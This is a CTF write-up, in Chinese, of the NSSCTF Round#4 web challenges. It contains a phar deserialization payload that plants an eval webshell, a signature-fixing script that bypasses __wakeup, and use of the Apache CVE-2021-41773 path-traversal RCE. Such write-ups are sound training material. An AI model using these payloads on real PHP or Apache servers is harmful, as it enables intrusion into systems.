---
title: "NSSCTF Round#4 Web Writeup"
date: 2022-08-03T22:12:24+08:00
draft: false
author: "X1r0z"

tags: ['ctf','php']
categories: ['web']

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
math:
  enable: false
lightgallery: false
---

等 ez_web (revenge) 出来才发现原来的 ez_web 直接读 /flag 就行...

ez_rce 一开始因为没装插件的原因一直想不出来 (被打)

<!--more-->

## 1zweb

![20220803125540](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220803125540.png)

查询文件处可以读文件

index.php

```php
<?php
class LoveNss{
    public $ljt;
    public $dky;
    public $cmd;
    public function __construct(){
        $this->ljt="ljt";
        $this->dky="dky";
        phpinfo();
    }
    public function __destruct(){
        if($this->ljt==="Misc"&&$this->dky==="Re")
            eval($this->cmd);
    }
    public function __wakeup(){
        $this->ljt="Re";
        $this->dky="Misc";
    }
}
$file=$_POST['file'];
if(isset($_POST['file'])){
    echo file_get_contents($file);
}
```

upload.php

```php
<?php
if ($_FILES["file"]["error"] > 0){
    echo "上传异常";
}
else{
    $allowedExts = array("gif", "jpeg", "jpg", "png");
    $temp = explode(".", $_FILES["file"]["name"]);
    $extension = end($temp);
    if (($_FILES["file"]["size"] && in_array($extension, $allowedExts))){
        $content=file_get_contents($_FILES["file"]["tmp_name"]);
        $pos = strpos($content, "__HALT_COMPILER();");
        if(gettype($pos)==="integer"){
            echo "ltj一眼就发现了phar";
        }else{
            if (file_exists("./upload/" . $_FILES["file"]["name"])){
                echo $_FILES["file"]["name"] . " 文件已经存在";
            }else{
                $myfile = fopen("./upload/".$_FILES["file"]["name"], "w");
                fwrite($myfile, $content);
                fclose($myfile);
                echo "上传成功 ./upload/".$_FILES["file"]["name"];
            }
        }
    }else{
        echo "dky不喜欢这个文件 .".$extension;
    }
}
?>
```

有一个类 LoveNSS, 想到了 phar 反序列化

这里也没啥 pop 链的, 直接改字段

payload

```php
<?php

class LoveNss{
    public $ljt = "Misc";
    public $dky = "Re";
    public $cmd = 'eval($_REQUEST[1]);';

}

$o = new LoveNss();

@unlink("phar.phar");
$phar = new Phar("phar.phar");
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>");
$phar->setMetadata($o);
$phar->addFromString("test.txt", "test"); 
$phar->stopBuffering();

?>
```

但是 upload.php 会检测文件中是否含有 `__HALT_COMPILER();` 这个关键字

大小写绕过无效, phar 不解析

网上搜了一下发现 phar 绕过的新姿势

[https://www.anquanke.com/post/id/240007](https://www.anquanke.com/post/id/240007)

可以通过 tar gzip b2zip 的方式压缩 phar 文件, PHP 处理时会自动解压缩并且解析里面的 phar

同时这里存在 `__wakeup`, 可以改数字绕过

> 当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过 __wakeup 的执行

Linux 下使用 `gzip phar.phar` 压缩, 改后缀为 png 上传

![20220803130051](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220803130051.png)

报错 `broken signature`

PHP 官方手册查了一下发现有签名校验

网上搜了好长时间都没结果... 然后想起来前几天的强网杯 easyweb 也是要绕过 `__wakeup`

于是换了个关键词在 Google 上搜了一会就出来了...

[https://www.wangan.com/p/7fy78yfaa40486ed#easyweb](https://www.wangan.com/p/7fy78yfaa40486ed#easyweb)

[http://www.yongsheng.site/2022/05/14/phar/](http://www.yongsheng.site/2022/05/14/phar/)

贴一下改签的脚本

```python
from hashlib import sha1

file = open('phar.phar','rb+').read()

text = file[:-28]

last = file[-8:]

new_file = text + sha1(text).digest() + last

open('new.phar','wb').write(new_file)
```

本地运行后改后缀上传

![20220803130513](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220803130513.png)

上传成功

![20220803130554](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220803130554.png)

链接

![20220803130700](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220803130700.png)

![20220803130713](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220803130713.png)

## 1zweb (revenge)

和上面的一样基本没区别

index.php 略有改动

```php
if(isset($_POST['file'])){
    if (preg_match("/flag/i", $file)) {
    	die("nonono");
    }
    echo file_get_contents($file);
}
```

md 看了才知道原来那题直接读 /flag 就行...

wp 同上


## ez_rce

这题一开始没做出来, 原因是没装 Wappalyzer...

![20220803220146](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220803220146.png)

apache 2.4.49

存在一个路径穿越漏洞 CVE-2021-41773

[https://www.cnblogs.com/RichardYg/p/16272797.html](https://www.cnblogs.com/RichardYg/p/16272797.html)

目录遍历的 exp 测试失败, 命令执行 exp 测试成功

![20220803220317](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220803220317.png)

有一个 `flag_is_here` 文件夹

![20220803220342](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220803220342.png)

一共四层文件夹, 每一个文件夹都是 0-9

![20220803220428](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220803220428.png)

明显需要爆破一下

![20220803220458](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220803220458.png)

Attack type 设置为 Cluster bomb

这样一共就是 `10*10*10*10` 的 payload

![20220803221112](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220803221112.png)

得到 flag